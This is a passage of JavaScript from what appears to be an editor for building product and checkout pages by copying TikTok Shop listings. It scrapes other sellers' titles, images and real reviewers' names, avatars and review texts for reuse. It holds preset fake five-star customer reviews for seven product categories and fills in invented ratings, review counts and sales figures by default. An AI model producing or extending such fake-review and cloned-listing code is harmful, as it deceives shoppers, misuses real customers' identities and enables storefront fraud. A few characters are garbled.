        // O navegador nao executa PHP, entao removemos os blocos PHP para a previa visual.
        // Os <?php ... ?> que ESCREVEM conteudo (echo do resumo) sao trocados por um item de exemplo.
        const exItem = {
            title: data.productTitle || 'Produto de exemplo',
            price: data.currentPrice || '0,00',
            image: data.mainImage || 'https://placehold.co/200x200?text=Produto',
            qty: 1, variant: 'Padrao'
        };
        checkoutContent = stripPhpForPreview(checkoutContent, exItem);
        return injectPreviewNav(checkoutContent);
    }
    // Padrão: página de produto (index)
    return injectPreviewNav(generateHTMLCode());
}

function showPreviewPage(page) {
    currentPreviewPage = page || 'produto';
    document.querySelectorAll('.preview-page-tab').forEach(function(tab){
        tab.classList.toggle('active', tab.getAttribute('data-page') === currentPreviewPage);
    });
    updateOutput();
}

function updateOutput() { 
  try {
    const htmlCode = buildPreviewPage(currentPreviewPage); 
    if (el("preview-iframe")) { 
      el("preview-iframe").srcdoc = htmlCode; 
    } 
  } catch(e) {
    console.error('[v0] Erro ao atualizar output:', e.message);
    if (el("preview-iframe")) {
      el("preview-iframe").srcdoc = '<div style="padding:20px;color:red;font-family:monospace;"><strong>Erro ao gerar preview:</strong><br>' + e.message + '</div>';
    }
  }
}
function updateOutputDebounced() { clearTimeout(debounceTimer); debounceTimer = setTimeout(updateOutput, 300); }
// Recebe pedidos de navegação vindos de dentro da prévia (iframe) e troca a página exibida
if (typeof window !== 'undefined') {
    window.addEventListener('message', function(ev){
        if (ev && ev.data && ev.data.__previewNav) { showPreviewPage(ev.data.__previewNav); }
    });
}
function setupLiveUpdateListeners(containerElement) {
  const inputs = containerElement.querySelectorAll("input, textarea, select");
  inputs.forEach((input) => {
    input.removeEventListener("input", updateOutputDebounced);
    input.removeEventListener("change", updateOutputDebounced);
    input.addEventListener("input", updateOutputDebounced);
    input.addEventListener("change", updateOutputDebounced);
  });
}

// INICIALIZAÇÃO
document.addEventListener("DOMContentLoaded", () => {
  ensureReviewPresetUI();
  initItemEditors();
  updateProjectList();
  if(el("import-file-input")) el("import-file-input").addEventListener("change", handleFileSelect, false);
  
  // Listener para troca de idioma em tempo real
  if(el("site-language")) {
    el("site-language").addEventListener("change", function() {
      console.log('[Editor] Idioma alterado para:', this.value);
      updateOutput();
    });
  }

  if(el("editor-form")) setupLiveUpdateListeners(el("editor-form"));
  switchToPreview();
  
  document.querySelectorAll(".tab-button").forEach((button) => {
    button.addEventListener("click", () => {
        document.querySelectorAll(".tab-button, .tab-content").forEach((el) => el.classList.remove("active"));
        button.classList.add("active");
        const contentId = button.dataset.tab;
        const content = document.getElementById(contentId);
        if(content) content.classList.add("active");
    });
  });
});

function applyBulkRecSizes() {
    const title = document.getElementById('bulk-rec-title').value || "Tamanho";
    const valuesStr = document.getElementById('bulk-rec-values').value;
    if (!valuesStr || valuesStr.trim() === "") { alert("Por favor, digite os tamanhos separados por vírgula (Ex: P, M, G)."); return; }
    const values = valuesStr.split(',').map(s => s.trim()).filter(Boolean);
    const recItems = document.querySelectorAll('#recommendation-items .item-editor');
    if (recItems.length === 0) { alert("Adicione produtos na lista de recomendações antes de aplicar."); return; }
    if(!confirm(`Isso irá alterar os tamanhos de ${recItems.length} produtos para: ${values.join(', ')}. Deseja continuar?`)) return;
    recItems.forEach(item => {
        const titleInput = item.querySelector('.rec-variation2-title');
        if(titleInput) titleInput.value = title;
        const sizeContainer = item.querySelector('.rec-size-options');
        if (sizeContainer) {
            sizeContainer.innerHTML = '';
            values.forEach(val => {
                const optionDiv = document.createElement("div");
                optionDiv.className = "option-item";
                optionDiv.innerHTML = `<input type="text" class="rec-size-name" placeholder="Tamanho" value="${val}"><button class="remove-btn" onclick="removeOption(this)">X</button>`;
                sizeContainer.appendChild(optionDiv);
            });
        }
    });
    setupLiveUpdateListeners(document.getElementById('recommendation-items')); 
    updateOutputDebounced();
    alert("Tamanhos aplicados com sucesso!");
}

window.reviewDraftPresets = window.reviewDraftPresets || {
  eletronico: [
                "Fiquei surpreso com a qualidade! A imagem é muito nítida, o som é limpo e a bateria aguenta bem o tranco do dia a dia. O desempenho não deixa a desejar em nada.",
                "A entrega foi super rápida e veio muito bem embalado, com plástico bolha e tudo. Minha primeira impressão foi excelente, dá para ver que é um produto premium.",
                "Muito fácil de configurar e usar, não tive nenhuma dificuldade. O produto é exatamente como no anúncio, sem surpresas negativas. Recomendo demais!",
                "Pelo preço que paguei, o custo-benefício é imbatível. O acabamento é muito bem feito, parece ser bem resistente e durável. Valeu cada centavo."
            ],
            cozinha: [
                "Mudou minha rotina! Muito prático para usar no dia a dia e, o melhor de tudo, é super fácil de limpar. Não fico mais sem aqui em casa.",
                "O material é de primeira linha. O acabamento é impecável e dá para sentir que é um produto bem resistente, que vai durar muitos anos na cozinha.",
                "O tamanho é ideal, nem muito grande nem muito pequeno. A capacidade atendeu perfeitamente às necessidades da minha família. Nota dez!",
                "Chegou antes do prazo e a embalagem estava bem reforçada, o que me deixou tranquilo. Veio tudo certinho, sem nenhum arranhão."
            ],
            sapato: [
                "Extremamente confortável! O acabamento interno é macio e ele se ajusta perfeitamente ao pé, não aperta em lugar nenhum. Dá para usar o dia todo.",
                "Pedi o meu número de costume e serviu como uma luva. O tamanho corresponde exatamente à tabela, o que facilita muito na hora da compra.",
                "O material é excelente e a costura é muito bem feita. Ao vivo ele é ainda mais bonito que nas fotos, fiquei impressionado com a qualidade do design.",
                "O prazo de entrega foi respeitado e chegou super rápido. O rastreio funcionou bem e o produto veio bem protegido na caixa original."
            ],
            vestuario: [
                "O tecido é uma delícia, muito macio e com um caimento perfeito no corpo. Dá para ver que é uma peça de qualidade, com boa durabilidade.",
                "Fiquei com medo de ser diferente, mas a peça é idêntica às fotos do anúncio. A cor é vibrante e o modelo valoriza muito o visual.",
                "Acabamento impecável, sem fios soltos ou defeitos. Além de linda, a roupa é muito confortável para usar em qualquer ocasião.",
                "O tamanho ficou ótimo seguindo as medidas do site. A entrega foi bem ágil e chegou antes do que eu esperava. Com certeza comprarei mais vezes."
            ],
            beleza: [
                "A textura é maravilhosa e o rendimento é ótimo. Tem uma fragrância suave muito gostosa e a sensação na pele após o uso é de hidratação total.",
                "A embalagem é linda e muito prática, dá até gosto de deixar exposta na penteadeira. A apresentação do produto como um todo é de muito bom gosto.",
                "Muito simples de aplicar, espalha super bem e não deixa resíduos pegajosos. Em poucos minutos você já sente a diferen��a na aplicação.",
                "Estou usando há alguns dias e o resultado é visível. Minha pele/cabelo está com outra vida, muito mais saudável e com um brilho natural incrível."
            ],
            utilidades: [
                "É aquele tipo de item que a gente não sabe como viveu sem antes. Traz muita praticidade e realmente facilita as tarefas chatas do dia a dia.",
                "Achei o material bem robusto. O acabamento é simples mas muito funcional, e a resistência dele me surpreendeu positivamente.",
                "Cumpre exatamente o que promete no anúncio. É um produto honesto, eficiente e que resolve o problema de forma rápida.",
                "Tudo certo com a entrega. Chegou bem rápido e a embalagem garantiu que o produto chegasse intacto, sem nenhuma avaria."
            ],
            infantil: [
                "O material é muito seguro e o toque é bem suave, ideal para crianças. O conforto parece ser prioridade aqui, meu filho adorou usar.",
                "Dá para perceber o cuidado no acabamento, tudo muito bem reforçado e com cores vivas. A qualidade é superior a muitos que já vi por aí.",
                "O tamanho ficou perfeito e a criança se adaptou super rápido ao uso. É funcional e ao mesmo tempo diverte, o que �� ótimo.",
                "Chegou dentro do prazo e a apresentação do pacote foi um diferencial, veio tudo muito caprichado e pronto para presente se fosse o caso."
            ]
};

// ============================================================================
// ========= FUNCAO PARA EXTRAIR PRODUTO DE RECOMENDACAO DO TIKTOK ============
// ============================================================================

// Funcao para extrair dados completos de um produto para recomendacoes
// Usa a mesma logica de extractFromTikTokHtml mas adiciona a lista de recomendacoes
function extractRecommendationsFromTikTok() {
    const inputEl = document.getElementById('tiktok-rec-html-input');
    const statusEl = document.getElementById('tiktok-rec-html-status');
    
    if (!inputEl) {
        alert('Campo de HTML nao encontrado!');
        return;
    }
    
    const rawHtml = inputEl.value.trim();
    if (!rawHtml) {
        alert('Cole o HTML de um produto do TikTok Shop no campo de texto.');
        return;
    }
    
    if (statusEl) statusEl.innerText = 'Extraindo dados do produto...';
    
    try {
        // Usar a funcao extractFromTikTokHtml para extrair os dados
        // Mas em vez de preencher o formulario principal, adicionar como recomendacao
        
        // Decodificar HTML entities
        const textarea = document.createElement('textarea');
        textarea.innerHTML = rawHtml;
        let decodedHtml = textarea.value;
        
        // Tentar encontrar JSON __MODERN_ROUTER_DATA__ no HTML
        const jsonRegex = /window\.__MODERN_ROUTER_DATA__\s*=\s*(\{[\s\S]*?\});?\s*(?:<\/script>|window\.|$)/i;
        const jsonMatch = decodedHtml.match(jsonRegex);
        
        let jsonData = null;
        if (jsonMatch && jsonMatch[1]) {
            try {
                jsonData = JSON.parse(jsonMatch[1]);
            } catch (e) { }
        }
        
        // Extrair dados do JSON e HTML
        const parser = new DOMParser();
        const doc = parser.parseFromString(decodedHtml, 'text/html');
        
        // Inicializar dados extraidos
        let title = '';
        let currentPrice = '';
        let originalPrice = '';
        let mainImage = '';
        let additionalImages = [];
        let description = '';
        let descriptionImages = [];
        let productRating = '';
        let salesCount = '';
        let colors = [];
        let sizes = [];
        let reviews = [];
        let jsonVariants = [];
        
        // Arrays para imagens extraidas (IGUAL ao produto principal)
        const productImages = [];
        const reviewClientImages = [];
        const avatarImages = [];
        
        // Funcao para classificar imagem pela URL (IGUAL ao produto principal)
        function classifyImage(url) {
            if (url.includes('resize-webp:800:800') || url.includes('800x800')) return 'product';
            if (url.includes('cropcenter:100:100') || url.includes('cropcenter') || (url.includes('tiktokcdn') && url.includes('avt'))) return 'avatar';
            if (url.includes('crop-webp:300:300') || url.includes('crop-webp')) return 'review';
            return null;
        }
        
        // Buscar URLs em data-src (imagens lazy-load)
        const dataSrcRegex = /data-src="([^"]+\.(?:webp|jpg|jpeg|png|gif)[^"]*)"/gi;
        const foundUrls = new Set();
        let match;
        
        while ((match = dataSrcRegex.exec(decodedHtml)) !== null) {
            const url = match[1];
            if (url && !foundUrls.has(url)) {
                foundUrls.add(url);
                const type = classifyImage(url);
                if (type === 'product') productImages.push(url);
                else if (type === 'avatar') avatarImages.push(url);
                else if (type === 'review') reviewClientImages.push(url);
            }
        }
        
        // Tambem buscar em src
        const srcRegex = /src="(https?:\/\/p[^"]+\.(?:webp|jpg|jpeg|png|gif)[^"]*)"/gi;
        while ((match = srcRegex.exec(decodedHtml)) !== null) {
            const url = match[1];
            if (url && !foundUrls.has(url)) {
                foundUrls.add(url);
                const type = classifyImage(url);
                if (type === 'product' && !productImages.includes(url)) productImages.push(url);
                else if (type === 'avatar' && !avatarImages.includes(url)) avatarImages.push(url);
                else if (type === 'review' && !reviewClientImages.includes(url)) reviewClientImages.push(url);
            }
        }
        
        // 1. Extrair do JSON se disponivel
        if (jsonData) {
            const loaderData = jsonData.loaderData || {};
            const productData = loaderData['product-detail'] || loaderData['pdp'] || {};
            const productInfo = productData.productInfo || productData.product || {};
            const pageData = productData.pageData || productData.data || {};
            
            title = productInfo.name || productInfo.title || pageData?.title || '';
            
            if (productInfo.price) {
                if (typeof productInfo.price === 'object') {
                    currentPrice = productInfo.price.salePrice || productInfo.price.price || '';
                    originalPrice = productInfo.price.originalPrice || productInfo.price.marketPrice || '';
                } else {
                    currentPrice = productInfo.price;
                }
            }
            
            if (productInfo.images && Array.isArray(productInfo.images)) {
                mainImage = productInfo.images[0] || '';
                additionalImages = productInfo.images.slice(1) || [];
            }
            
            description = productInfo.description || productInfo.desc || '';
            
            if (productInfo.descriptionImages && Array.isArray(productInfo.descriptionImages)) {
                descriptionImages = productInfo.descriptionImages;
            }
            
            productRating = productInfo.rating || productInfo.avgRating || '';
            salesCount = productInfo.soldCount || productInfo.salesCount || '';
            
            // Extrair variacoes do JSON (IGUAL ao produto principal)
            const skuList = productInfo?.skuList || productInfo?.skus || pageData?.skuList || [];
            const colorMap = new Map();
            const sizesSet = new Set();
            
            skuList.forEach(sku => {
                const specs = sku?.specList || sku?.specs || [];
                let colorName = '';
                let sizeName = '';
                
                specs.forEach(s => {
                    const sName = (s?.specName || s?.name || '').toLowerCase();
                    if (sName.includes('cor') || sName.includes('color')) {
                        colorName = s?.specValue || s?.value || '';
                    }
                    if (sName.includes('tamanho') || sName.includes('size') || sName.includes('numero')) {
                        sizeName = s?.specValue || s?.value || '';
                    }
                });
                
                if (colorName) {
                    const skuImg = sku?.thumbUrl || sku?.image || sku?.imgUrl || '';
                    if (!colorMap.has(colorName)) {
                        colorMap.set(colorName, { name: colorName, imageUrl: skuImg, price: currentPrice });
                    }
                }
                if (sizeName) sizesSet.add(sizeName);
            });
            
            if (colorMap.size > 0) jsonVariants = Array.from(colorMap.values());
            if (sizesSet.size > 0) sizes = Array.from(sizesSet);
        }
        
        // 2. Fallback: extrair do HTML se nao encontrou no JSON
        if (!title) {
            const titleEl = doc.querySelector('[class*="productTitle"], [class*="product-title"], h1, [data-e2e="product-title"]');
            if (titleEl) title = titleEl.textContent.trim();
        }
        
        if (!currentPrice) {
            const priceEl = doc.querySelector('[class*="price"], [data-e2e="product-price"]');
            if (priceEl) currentPrice = priceEl.textContent.replace(/[^\d,\.]/g, '');
        }
        
        // Usar imagens de produto extraidas
        if (productImages.length > 0) {
            mainImage = mainImage || productImages[0];
            if (additionalImages.length === 0) {
                additionalImages = productImages.slice(1, 6);
            }
        }
        
        // Extrair imagens de descricao (formato diferente de 800:800)
        const descImgRegex = /https?:\/\/p16-oec-sg\.ibyteimg\.com\/[^"'\s]+/gi;
        const descImgMatches = decodedHtml.match(descImgRegex) || [];
        descImgMatches.forEach(url => {
            if (!url.includes('800:800') && !url.includes('300:300') && !url.includes('100:100')) {
                const sizeMatch = url.match(/(\d{3,4}):(\d{3,4})/);
                if (sizeMatch) {
                    const w = parseInt(sizeMatch[1]);
                    const h = parseInt(sizeMatch[2]);
                    if (Math.abs(w - h) > 50 && !descriptionImages.includes(url)) {
                        descriptionImages.push(url);
                    }
                }
            }
        });
        
        // Extrair descricao formatada - USANDO formatDescriptionHtml igual ao produto principal
        if (!description) {
            // Primeiro tenta extrair do JSON se disponivel
            if (jsonData) {
                const loaderData = jsonData.loaderData || {};
                const productData = loaderData['product-detail'] || loaderData['pdp'] || {};
                const productInfo = productData.productInfo || productData.product || {};
                if (productInfo.description) {
                    // Se veio do JSON, formatar com a funcao padrao
                    const lines = productInfo.description.split('\n').filter(l => l.trim());
                    description = typeof formatDescriptionHtml === 'function' ? formatDescriptionHtml(lines) : productInfo.description;
                }
            }
            
            // Fallback: extrair do HTML usando a mesma logica do produto principal
            if (!description) {
                const textEls = doc.querySelectorAll('[class*="text-ivhDIx"], [class*="sectionContent"] div, [class*="description"] div');
                const descTexts = [];
                textEls.forEach(el => {
                    const t = el.textContent.trim();
                    if (t && t.length > 3 && !t.includes('TikTok') && !t.includes('http') && !t.includes('View more')) {
                        if (!descTexts.includes(t)) descTexts.push(t);
                    }
                });
                if (descTexts.length > 0) {
                    // Usar formatDescriptionHtml igual ao produto principal
                    description = typeof formatDescriptionHtml === 'function' ? formatDescriptionHtml(descTexts) : descTexts.join('<br>');
                }
            }
        }
        
        // ========== EXTRAIR REVIEWS COMPLETAS (IGUAL AO PRODUTO PRINCIPAL) ==========
        
        // 1) Extrair nomes dos usuarios do alt das imagens
        const userNames = [];
        const altNameRegex = /alt="Product Review[^"]*from ([^"]+)"/gi;
        let nameMatch;
        while ((nameMatch = altNameRegex.exec(decodedHtml)) !== null) {
            let name = nameMatch[1].trim().replace(/\s*\d+$/, '');
            if (name && !userNames.includes(name)) userNames.push(name);
        }
        
        // 2) Extrair detalhes de variante "Item: Caramelo, 38"
        const detailsList = [];
        const detailsRegex = /Item(?:<!-- -->)?:\s*(?:<\/div>)?([^<\n]{2,60})/gi;
        let detailMatch;
        while ((detailMatch = detailsRegex.exec(decodedHtml)) !== null) {
            const detail = detailMatch[1].trim().replace(/^<\/div>/, '').trim();
            if (detail && detail.length > 1 && detail.length < 80) {
                detailsList.push('Item: ' + detail);
            }
        }
        
        // 3) Extrair textos de review - melhorado para limpar prefixos de atributos
        const reviewTexts = [];
        const h4ReviewRegex = /<div[^>]*class="[^"]*H4-Regular[^"]*text-color-UIText1[^"]*"[^>]*>([^<]+)<\/div>/gi;
        let h4Match;
        while ((h4Match = h4ReviewRegex.exec(decodedHtml)) !== null && reviewTexts.length < 5) {
            let txt = h4Match[1].trim();
            if (txt && txt.length > 10) {
                const rejectPatterns = ['{', 'http', 'function', 'display:', 'Entrega', 'Devolução', 'TikTok', 'R$', 'Recomendado'];
                let shouldReject = false;
                for (const pattern of rejectPatterns) {
                    if (txt.includes(pattern)) { shouldReject = true; break; }
                }
                if (!shouldReject && !reviewTexts.includes(txt)) {
                    // Limpar prefixos de atributos como "Forma e tamanho: X Aroma: Y"
                    // Converter para formato mais legivel
                    txt = txt.replace(/([A-Za-zÀ-ÿ\s]+):\s*/g, '\n$1: ').trim();
                    // Remover linha vazia inicial se houver
                    if (txt.startsWith('\n')) txt = txt.substring(1);
                    reviewTexts.push(txt);
                }
            }
        }
        
        // 4) Contar estrelas por review
        const starCounts = [];
        const starBlockRegex = /(<div[^>]*>(?:(?!<\/div>).)*star-solid(?:(?!<\/div>).)*<\/div>)/gi;
        let starBlock;
        while ((starBlock = starBlockRegex.exec(decodedHtml)) !== null) {
            const solidCount = (starBlock[1].match(/star-solid/g) || []).length;
            if (solidCount > 0 && solidCount <= 5) starCounts.push(solidCount);
        }
        
        // 5) Criar reviews completas (max 3)
        const numReviews = Math.min(Math.max(userNames.length, avatarImages.length, reviewClientImages.length, reviewTexts.length), 3);
        for (let i = 0; i < numReviews; i++) {
            reviews.push({
                name: userNames[i] || 'Cliente ' + (i + 1),
                avatarUrl: avatarImages[i] || '',
                details: detailsList[i] || 'Item: Padrao',
                stars: starCounts[i] || 5,
                text: reviewTexts[i] || '',
                image: reviewClientImages[i] || ''
            });
        }
        
        // ========== EXTRAIR VARIACOES (IGUAL AO PRODUTO PRINCIPAL) ==========
        if (jsonVariants.length > 0) {
            colors = jsonVariants.slice(0, 10);
        } else {
            // Fallback: buscar cores conhecidas no HTML
            const knownColors = ['Off-white', 'Off-White', 'Caramelo', 'Preto', 'Branco', 'Rosa', 'Vermelho', 'Azul', 'Verde', 'Amarelo', 'Laranja', 'Roxo', 'Marrom', 'Bege', 'Nude', 'Dourado', 'Prata', 'Cinza'];
            const colorPositions = [];
            knownColors.forEach(color => {
                const pos = decodedHtml.indexOf(color);
                if (pos !== -1) colorPositions.push({ name: color, position: pos });
            });
            colorPositions.sort((a, b) => a.position - b.position);
            
            const seenColors = new Set();
            colorPositions.forEach(cp => {
                if (!seenColors.has(cp.name.toLowerCase()) && colors.length < 5) {
                    seenColors.add(cp.name.toLowerCase());
                    colors.push({ name: cp.name, imageUrl: productImages[colors.length] || '', price: currentPrice });
                }
            });
        }
        
        // Extrair tamanhos do HTML se nao encontrou no JSON
        if (sizes.length === 0) {
            const sizeRegex = /(?:Tamanho|Size|Numero)[:\s]*(\d{2})/gi;
            let sizeMatch;
            const sizeSet = new Set();
            while ((sizeMatch = sizeRegex.exec(decodedHtml)) !== null) {
                sizeSet.add(sizeMatch[1]);
            }
            sizes = Array.from(sizeSet);
        }
        
        // Validar dados minimos
        if (!title) {
            throw new Error('Nao foi possivel extrair o titulo do produto.');
        }
        
        // Obter logo do produto principal (sera a mesma para recomendacoes)
        const mainStoreLogo = document.getElementById('store-logo-url')?.value || '';
        const mainStoreName = document.getElementById('store-name')?.value || '';
        
        // Criar objeto do produto de recomendacao com TODOS os dados
        const recProduct = {
            title: title,
            productTitle: title,
            price: currentPrice,
            currentPrice: currentPrice,
            originalPrice: originalPrice || currentPrice,
            image: mainImage,
            mainImage: mainImage,
            additionalImages: additionalImages,
            description: description,
            productDescription: description,
            descriptionImages: descriptionImages,
            productRating: productRating || '4.9',
            reviewCount: reviews.length > 0 ? String(reviews.length) : '15',
            salesCount: salesCount || '100',
            storeName: mainStoreName,
            storeLogoUrl: mainStoreLogo,
            colors: colors,
            sizes: sizes,
            reviews: reviews,
            variation1Title: 'Cor',
            variation2Title: 'Tamanho'
        };
        
        // Adicionar a lista de recomendacoes
        addRecProduct(recProduct);
        
        // Limpar input
        inputEl.value = '';
        
        // Mostrar resumo
        let successMsg = 'Produto adicionado: ' + title.substring(0, 25) + '...';
        if (additionalImages.length > 0) successMsg += ' | ' + (additionalImages.length + 1) + ' imgs';
        if (descriptionImages.length > 0) successMsg += ' | ' + descriptionImages.length + ' imgs desc';
        if (reviews.length > 0) successMsg += ' | ' + reviews.length + ' reviews';
        if (colors.length > 0) successMsg += ' | ' + colors.length + ' cores';
        
        if (statusEl) statusEl.innerText = successMsg;
        
    // Atualizar preview com protecao contra erros
    try {
        if (typeof setupLiveUpdateListeners === 'function') {
            setupLiveUpdateListeners(document.getElementById('recommendation-items'));
        }
        if (typeof updateOutputDebounced === 'function') {
            updateOutputDebounced();
        }
    } catch (e) {
        console.error('[v0] Erro ao atualizar preview:', e);
    }
        
    } catch (error) {
        console.error('[v0] Erro ao extrair dados:', error);
        if (statusEl) statusEl.innerText = 'Erro: ' + error.message;
    }
}

// Funcao auxiliar para escapar HTML em atributos value
function escapeHtmlAttr(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Funcao auxiliar para escapar conteudo de textarea
function escapeHtmlContent(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Funcao para adicionar um produto de recomendacao ao formulario
function addRecProduct(data = {}) {
    const container = document.getElementById('recommendation-items');
    if (!container) {
        alert('Container de recomendacoes nao encontrado!');
        return;
    }
    
    // Helper local para escape (fallback caso a funcao global nao exista)
    const safeEscape = (str) => {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    };
    
    const safeEscapeContent = (str) => {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    };
    
    // Usar funcoes globais se disponiveis, senao usar locais
    const esc = typeof escapeHtmlAttr === 'function' ? escapeHtmlAttr : safeEscape;
    const escContent = typeof escapeHtmlContent === 'function' ? escapeHtmlContent : safeEscapeContent;
    
    const index = container.querySelectorAll('.item-editor').length;
    
    const div = document.createElement('div');
    div.className = 'item-editor';
    div.style.cssText = 'background: #fff; border: 1px solid #e5e7eb; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05);';
    
    // Preparar dados das cores/variacoes (com escape) - usando classes corretas para getEditorData
    const colorsHtml = (data.colors || []).map((c, i) => `
        <div class="option-item" style="display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 8px; align-items: center;">
            <input type="text" class="rec-color-name" placeholder="Nome da cor" value="${esc(c.name)}" style="flex: 1; min-width: 100px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
            <input type="text" class="rec-color-image-url" placeholder="URL da imagem" value="${esc(c.imageUrl)}" style="flex: 2; min-width: 150px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
            <input type="text" class="rec-color-price" placeholder="Preco" value="${esc(c.price || data.currentPrice)}" style="width: 80px; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
            <input type="hidden" class="rec-color-checkout-url" value="">
            <button class="remove-btn" onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">X</button>
        </div>
    `).join('');
    
    // Preparar dados dos tamanhos (com escape)
    const sizesHtml = (data.sizes || []).map(s => `
        <div class="option-item" style="display: flex; gap: 8px; margin-bottom: 8px; align-items: center;">
            <input type="text" class="rec-size-name" placeholder="Tamanho" value="${esc(s)}" style="flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
            <button class="remove-btn" onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;">X</button>
        </div>
    `).join('');
    
    // Preparar reviews com TODOS os campos (com escape) - usando classes corretas para getEditorData
    const reviewsHtml = (data.reviews || []).map((r, i) => `
        <div class="rec-review-item" style="background: #f8fafc; padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid #e5e7eb;">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 8px;">
                <div>
                    <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Nome do Cliente</label>
                    <input type="text" class="rec-rev-name" placeholder="Nome" value="${esc(r.name)}" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
                <div>
                    <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Estrelas (1-5)</label>
                    <input type="number" class="rec-rev-stars" placeholder="5" value="${r.stars || 5}" min="1" max="5" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
            </div>
            <div style="margin-bottom: 8px;">
                <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Imagem de Perfil (Avatar)</label>
                <input type="text" class="rec-rev-avatar" placeholder="URL do avatar" value="${esc(r.avatarUrl)}" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
            </div>
            <div style="margin-bottom: 8px;">
                <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Item Comprado</label>
                <input type="text" class="rec-rev-details" placeholder="Item: Cor, Tamanho" value="${esc(r.details)}" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
            </div>
            <div style="margin-bottom: 8px;">
                <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Texto da Avaliacao</label>
                <textarea class="rec-rev-text" placeholder="Texto da avaliacao" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px; min-height: 60px;">${escContent(r.text)}</textarea>
            </div>
            <div style="margin-bottom: 8px;">
                <label style="display: block; font-size: 11px; color: #666; margin-bottom: 2px;">Foto do Produto Recebido</label>
                <input type="text" class="rec-rev-img" placeholder="URL da foto do produto" value="${esc(r.image)}" style="width: 100%; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
            </div>
            <button onclick="this.parentElement.remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;">Remover Avaliacao</button>
        </div>
    `).join('');
    
    div.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #e5e7eb;">
            <h4 style="margin: 0; color: #111; font-size: 16px; font-weight: 700;">Produto ${index + 1}</h4>
            <button onclick="this.closest('.item-editor').remove(); if(typeof updateOutputDebounced === 'function') updateOutputDebounced();" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600;">Remover</button>
        </div>
        
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Titulo</label>
                <input type="text" class="rec-title" value="${esc(data.title)}" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Preco Atual</label>
                <input type="text" class="rec-price" value="${esc(data.currentPrice)}" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
        </div>
        
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Preco Original</label>
                <input type="text" class="rec-original-price" value="${esc(data.originalPrice)}" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Link do Produto</label>
                <input type="text" class="rec-link" value="" placeholder="URL do produto" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
        </div>
        
        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-bottom: 15px;">
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Nota (Rating)</label>
                <input type="text" class="rec-product-rating" value="${esc(data.productRating) || '4.9'}" placeholder="4.9" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Num. Avaliacoes</label>
                <input type="text" class="rec-review-count" value="${esc(data.reviewCount) || '15'}" placeholder="15" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
            <div>
                <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Num. Vendas</label>
                <input type="text" class="rec-sales-count" value="${esc(data.salesCount) || '100'}" placeholder="100" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
            </div>
        </div>
        
        <div style="margin-bottom: 15px;">
            <label style="display: block; font-weight: 600; margin-bottom: 5px; font-size: 13px;">Imagem Principal</label>
            <input type="text" class="rec-image" value="${esc(data.mainImage)}" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
        </div>
